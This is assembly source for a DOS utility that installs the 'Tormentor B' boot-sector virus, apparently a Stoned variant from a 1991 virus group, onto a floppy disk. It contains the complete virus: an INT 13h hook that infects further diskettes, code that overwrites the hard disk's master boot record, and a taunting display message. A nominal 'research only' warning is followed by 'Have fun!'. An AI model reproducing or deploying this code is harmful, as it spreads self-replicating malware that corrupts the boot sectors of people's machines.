;******************************************************************************
; These equates are needed by Tormentor. Do not delete or change them...
;******************************************************************************

data_1e     equ 4Ch
data_2e     equ 4Eh
data_3e     equ 413h
data_4e     equ 43Fh
data_5e     equ 7C09h
data_6e     equ 7C0Bh
data_7e     equ 7C0Fh
data_8e     equ 0
data_9e     equ 8
data_10e    equ 9
data_11e    equ 0Dh
data_12e    equ 11h
data_18e    equ 3BEh
data_19e    equ 8050h
data_20e    equ 46Ch


code_seg segment
    assume cs:code_seg,ds:code_seg,es:code_seg
    
    org 100h

start:  jmp main

;*****************************************************************************
; Set up my macros here for ease's sake...
;*****************************************************************************

@disp   macro   string          
    mov dx,offset string
    mov ah,09h
    int 21h
endm

@exit   macro   
    mov ax,4c00h
    int 21h
endm

@cls    macro   mode
    mov ah,00h
    mov al,mode
    int 10h
endm

@pause  macro
    mov ah,08h
    int 21h
endm


boot_area dw    256 dup (0)     ; Buffer where we will store the
                    ; original boot sector in Drive A:

ident   db  '                 MAKETORM   v1.0 - Written by The High Evolutionary',13,10
    db  '                   Property of The RABID Nat''nl Development Corp.',13,10
    db  '------------------------------------------------------------------------------',13,10
    db  ' ',13,10
    db  'THIS PROGRAM WILL INSTALL TORMENTOR B ONTO A 5.25 360k FLOPPY',13,10
    db  ' ',13,10
    db  '* Note:',13,10
    db  '  -----',13,10
    db  ' ',13,10
    db  '  This program will move the original boot sector located at track 0, side 0',13,10
    db  ' sector 1, and will move it to track 0, side 1, sector 3. It will then write',13,10
    db  ' track 0, side 0, sector 1 with the working copy of Tormentor',13,10
    db  ' ',13,10
    db  ' WARNING! DO NOT USE THIS PROGRAM MALICIOUSLY! FOR INTERNAL RESEARCH PURPOSES',13,10
    db  '          ONLY!',13,10
    db  ' ',13,10
    db  ' [Press any key to continue, or press CTRL-BREAK to bail out]',13,10
    db  ' ',13,10
    db  ' $',13,10

r_sec   db  'Reading in drive A:/sector 1/track 0/side 0               ',13,10
    db  ' $',13,10

w_sec   db  'Writing to drive A:/sector 3/track 0/side 1               ',13,10
    db  ' $',13,10

r_error db  'Error reading in boot sector in drive A:                  ',13,10
    db  ' $',13,10

w_error db  'Error relocating boot sector in drive A:                  ',13,10
    db  ' $',13,10

good_read db    'Successful read of boot sector                            ',13,10
    db  ' $',13,10

good_write db   'Successful write of boot sector                           ',13,10
    db  ' $',13,10

inst_stone db   'Installing Tormentor onto diskette...                  ',13,10
    db  ' $',13,10

done_inst db    'Finished installing Tormentor. Have fun!               ',13,10
    db  ' $',13,10

inst_error db   'Error in installing Tormentor onto diskette            ',13,10
    db  ' $',13,10


main:   @cls    3           ; Clear the screen in 80x25 mode
    @disp   ident           ; Print out the title screen
    @pause

read_sec:
    call    goto
    @disp   r_sec
    mov ah,02h          ; Read in diskette
    mov al,1            ; Xfer 1 sector
    mov bx,offset boot_area ; Buffer to data
    mov ch,0            ; Track 0
    mov cl,1            ; Sector 1  
    mov dh,0            ; Head (Side) 0
    mov dl,1            ; Drive A:
    int 13h         ; Call BIOS
    jc  read_err        ; On error, say so...
    call    goto
    @disp   good_read           

write_sec:
    call    goto
    @disp   w_sec
    mov ah,03h          ; Write data from buffer
    mov al,1            ; Xfer 1 sector
    mov bx,offset boot_area ; Buffer to data
    mov ch,0            ; Track 0
    mov cl,3            ; Sector 3
    mov dh,1            ; Head (Side) 1
    mov dl,1            ; Drive A:
    int 13h         ; Call BIOS
    jc  write_error     ; Error? Then say so...
    call    goto
    @disp   good_write      ; Yippe! We did it!
    jmp ins_stoned

read_err:
    jmp read_error

goto:   mov ah,02h
    mov bh,00h
    mov dh,18
    mov dl,0
    int 10h
    ret

ins_stoned:
    call    goto
    @disp   inst_stone      ; Tell the guy we are going to install
                    ; the stoned virus
    pushf               ; Push all the flags becuase INT 26
                    ; destroys them
    mov al,1            ; Set for drive A:
    mov cx,1            ; Write 1 sector
    mov dx,0            ; Starting at sector 0
    mov bx,offset torm      ; Make buffer to TORMENTOR file handle
    int 26h         ; Call BIOS to write the diskette
    popf                ; Restore the flags we pushed
    jnc good_install        ; If there's no error, then say so...
    call    goto
    @disp   inst_error      ; SHIT! Tell the guy we fucked up...
    @exit               ; Bail out

good_install:
    call    goto
    @disp   done_inst       ; Yay! We sucessfully installed Torment
    @exit               ; Geddoudahere...

read_error:
    call    goto
    @disp   r_error         ; Display read error message
    @exit

write_error:
    call    goto
    @disp   w_error         ; Display write error message
    @exit   

;the_code   proc    near

torm        proc    far
  
begin:
;*      jmp far ptr loc_1       ;*(07C0:0005)
        db  0EAh, 05h, 00h,0C0h, 07h
        jmp loc_8           ; (01A1)
        add [bx+si],al
        add [bx+si],al
        add ch,ah
        add [bx+si],al
        add [bx+si],al
        jl  loc_2           ; Jump if <
loc_2:
        add ds:data_19e,bl
        cld             ; Clear direction
        add dh,[bp+si+17h]
        cmp ah,4
        jae loc_3           ; Jump if above or =
        or  dl,dl           ; Zero ?
        jnz loc_3           ; Jump if not zero
        xor ax,ax           ; Zero register
        mov ds,ax
        mov al,ds:data_4e
        test    al,1
        jnz loc_3           ; Jump if not zero
        call    sub_1           ; (013A)
loc_3:
        pop ax
        pop ds
        jmp dword ptr cs:data_10e
  
torm        endp
  
;��������������������������������������������������������������������������
;                  SUBROUTINE
;��������������������������������������������������������������������������
  
sub_1       proc    near
        push    bx
        push    cx
        push    dx
        push    es
        push    si
        push    di
        mov si,4
loc_4:
        mov ax,201h
        push    cs
        pop es
        mov bx,200h
        xor cx,cx           ; Zero register
        mov dx,cx
        inc cx
        pushf               ; Push flags
        call    dword ptr cs:data_10e
        jnc loc_5           ; Jump if carry=0
        xor ax,ax           ; Zero register
        pushf               ; Push flags
        call    dword ptr cs:data_10e
        dec si
        jnz loc_4           ; Jump if not zero
        jmp short loc_7     ; (019A)
        db  90h
loc_5:
        xor si,si           ; Zero register
        mov di,offset data_15
        cld             ; Clear direction
        push    cs
        pop ds
        lodsw               ; String [si] to ax
        cmp ax,[di]
        jne loc_6           ; Jump if not equal
        lodsw               ; String [si] to ax
        cmp ax,[di+2]
        je  loc_7           ; Jump if equal
loc_6:
        mov ax,301h
        mov bx,200h
        mov cl,3
        mov dh,1
        pushf               ; Push flags
        call    dword ptr cs:data_10e
        jc  loc_7           ; Jump if carry Set
        mov ax,301h
        xor bx,bx           ; Zero register
        mov cl,1
        xor dx,dx           ; Zero register
        pushf               ; Push flags
        call    dword ptr cs:data_10e
loc_7:
        pop di
        pop si
        pop es
        pop dx
        pop cx
        pop bx
        retn
sub_1       endp
  
loc_8:
        xor ax,ax           ; Zero register
        mov ds,ax
        cli             ; Disable interrupts
        mov ss,ax
        nop
        mov sp,7C00h
        sti             ; Enable interrupts
        mov ax,ds:data_1e
        mov ds:data_5e,ax
        mov ax,ds:data_2e
        mov ds:data_6e,ax
        mov ax,ds:data_3e
        dec ax
        dec ax
        mov ds:data_3e,ax
        mov cl,6
        shl ax,cl           ; Shift w/zeros fill
        mov es,ax
        mov ds:data_7e,ax
        mov ax,15h
        mov ds:data_1e,ax
        mov ds:data_2e,es
        mov cx,1DDh
        push    cs
        pop ds
        xor si,si           ; Zero register
        mov di,si
        cld             ; Clear direction
        rep movsb           ; Rep when cx >0 Mov [si] to es:[di]
        jmp dword ptr cs:data_11e
        db  0B8h, 00h, 00h,0CDh, 13h, 33h
        db  0C0h, 8Eh,0C0h,0B8h, 01h, 02h
        db  0BBh, 00h, 7Ch, 2Eh, 80h, 3Eh
        db   08h, 00h, 00h, 74h, 0Bh,0B9h
        db   07h, 00h,0BAh
data_15     db  80h
        db   00h,0CDh, 13h,0EBh, 49h, 90h
loc_9:
        mov cx,3
        mov dx,100h
        int 13h         ; Disk  dl=drive a  ah=func 00h
                        ;  reset disk, al=return status
        jc  loc_12          ; Jump if carry Set
        test    byte ptr es:data_20e,7
        jnz loc_11          ; Jump if not zero
        mov si,offset ds:[18Ah]
        push    cs
        pop ds
loc_10:
        lodsb               ; String [si] to al
        or  al,al           ; Zero ?
        jz  loc_11          ; Jump if zero
        mov ah,0Eh
        mov bh,0
        int 10h         ; Video display   ah=functn 0Eh
                        ;  write char al, teletype mode
        jmp short loc_10        ; (021E)
loc_11:
        push    cs
        pop es
        mov ax,201h
        mov bx,offset data_15
        mov cl,1
        mov dx,80h
        int 13h         ; Disk  dl=drive 0  ah=func 02h
                        ;  read sectors to memory es:bx
        jc  loc_12          ; Jump if carry Set
        push    cs
        pop ds
        mov si,offset data_15
        mov di,data_8e
        lodsw               ; String [si] to ax
        cmp ax,[di]
        jne loc_13          ; Jump if not equal
        lodsw               ; String [si] to ax
        cmp ax,[di+2]
        jne loc_13          ; Jump if not equal
loc_12:
        mov byte ptr cs:data_9e,0
        jmp dword ptr cs:data_12e
loc_13:
        mov byte ptr cs:data_9e,2
        mov ax,301h
        mov bx,offset data_15
        mov cx,7
        mov dx,80h
        int 13h         ; Disk  dl=drive 0  ah=func 03h
                        ;  write sectors from mem es:bx
        jc  loc_12          ; Jump if carry Set
        push    cs
        pop ds
        push    cs
        pop es
        mov si,data_18e
        mov di,offset ds:[1BEh]
        mov cx,242h
        rep movsb           ; Rep when cx >0 Mov [si] to es:[di]
        mov ax,301h
        xor bx,bx           ; Zero register
        inc cl
        int 13h         ; Disk  dl=drive 0  ah=func 03h
                        ;  write sectors from mem es:bx
        jmp short loc_12        ; (024F)
        db  7
        db  'Repent for ye shall be tormented'
        db  '...'
        db  7
        db  0Dh, 0Ah, 'Tormentor B - RABID In'
        db  't', 27h, 'nl Dev. Corp. ', 27h, '9'
        db  '1', 0Dh, 0Ah, 0Ah
  
;   the_code    ends
    code_seg    ends
end     start

  
  
  
seg_a       segment byte public
        assume  cs:seg_a, ds:seg_a
  
  
        org 100h
  
  
  
        end start
